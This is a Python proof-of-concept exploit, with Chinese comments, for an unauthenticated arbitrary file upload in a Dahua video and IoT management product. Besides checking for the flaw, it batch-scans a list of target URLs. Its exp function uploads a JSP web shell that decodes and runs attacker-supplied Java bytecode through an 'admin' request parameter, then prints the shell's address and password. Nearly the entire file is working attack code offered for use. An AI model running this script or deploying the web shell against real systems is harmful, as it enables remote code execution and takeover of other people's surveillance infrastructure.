# -*- coding: utf-8 -*-
# @Author  : beitso
# explanation: 一个菜🐶的poc
## 浙江大华技术股份有限公司是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商。 由于该系统对用户发送的数据包的验证存在缺陷，未经身份验证的攻击者可利用该漏洞实现在目标系统上执行任意代码，可利用该漏洞获取敏感信息。
## 「漏洞披露时间：2022/08/02 大概率 」
## 版本<=V3.001.0000004.18.R.2223994


import argparse
import json

import requests
import urllib3

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help='输入需要验证的URL', default='')
parser.add_argument('-f', '--file', help='输入需要批量验证的文件', default='')
parser.add_argument('-up', '--upload', help="输入需要上传的url", default='')
args = parser.parse_args()
urllib3.disable_warnings()

# 定义全局变量
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
    "Content-Type": "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT",
    "Connection": "close"

}
path = '/emap/devicePoint_addImgIco?hasSubsystem=true'


## 创建check 函数
def check(url):
    url = url.strip('/')
    check_url = url + path
    data = '--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name="upload"; filename="test.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n123\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--'
    try:
        return_data = requests.post(url=check_url, headers=headers, data=data, verify=False, timeout=3)
        return_shell_filename = json.loads(return_data.text)["data"]
        shell_url = url + "/upload/emap/society_new/" + return_shell_filename
        return_shell_data = requests.get(shell_url)

        if '123' in return_shell_data.text and return_shell_data.status_code == 200:
            print(f'✅  漏洞存在！！！当前URL为： {url} ')
        else:
            print(f'❌  漏洞不存在！！当前URL为： {url} ')
    except Exception as e:

        print(f' 出现异常，请手工利用  {url} ')


def more(file):
    print("正常验证")
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)


def exp(url):
    url = url.strip('/')
    check_url = url + path
    shell = str(
        '<%!\r\nclass FLEXIBILITY extends ClassLoader{\r\n  FLEXIBILITY(ClassLoader c){super(c);}\r\n  public Class well(byte[] b){\r\n    return super.defineClass(b, 0, b.length);\r\n  }\r\n}\r\npublic byte[] association(String str) throws Exception {\r\n  Class base64;\r\n  byte[] value = null;\r\n  try {\r\n    base64=Class.forName("sun.misc.BASE64Decoder");\r\n    Object decoder = base64.newInstance();\r\n    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });\r\n  } catch (Exception e) {\r\n    try {\r\n      base64=Class.forName("java.util.Base64");\r\n      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);\r\n      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });\r\n    } catch (Exception ee) {}\r\n  }\r\n  return value;\r\n}\r\n%>\r\n<%\r\nString cls = request.getParameter("admin");\r\nif (cls != null) {\r\n  new FLEXIBILITY(this.getClass().getClassLoader()).well(association(cls)).newInstance().equals(new Object[]{request,response});\r\n}\r\n%>\r\n')
    data = '--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name="upload"; filename="test.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n' + shell + '--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT'
    return_data = requests.post(url=check_url, headers=headers, data=data, verify=False, timeout=3)
    shell_filename = json.loads(return_data.text)["data"]
    shell_url = url + "/upload/emap/society_new/" + shell_filename
    print(f'✅  shell 密码：admin  {shell_url} ')


if __name__ == '__main__':
    if args.url != '' and args.file == '':
        check(args.url)
    if args.url == '' and args.file != '':
        more(args.file)
    if args.upload != '':
        exp(args.upload)
